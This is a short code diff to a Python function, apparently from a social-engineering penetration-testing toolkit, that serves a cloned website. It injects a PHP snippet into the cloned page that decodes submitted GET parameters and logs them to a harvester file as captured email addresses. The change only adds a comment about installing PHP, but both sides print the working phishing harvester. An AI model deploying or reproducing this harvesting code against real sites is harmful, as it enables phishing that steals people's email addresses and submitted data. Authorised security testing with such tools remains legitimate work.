@@ -365,7 +365,7 @@ def web_server_start():
             fileopen = open("%s/index.html" % (apache_path), "r")
             data = fileopen.read()
             data = data.replace(
-                "<body>", """<body><?php $file = 'harvester_%s.txt'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (now))
+                "<body>", """<body><?php $file = 'harvester_%s.txt'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>\n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */""" % (now))
             filewrite = open("%s/index.php" % (apache_path), "w")
             filewrite.write(data)
             filewrite.close()
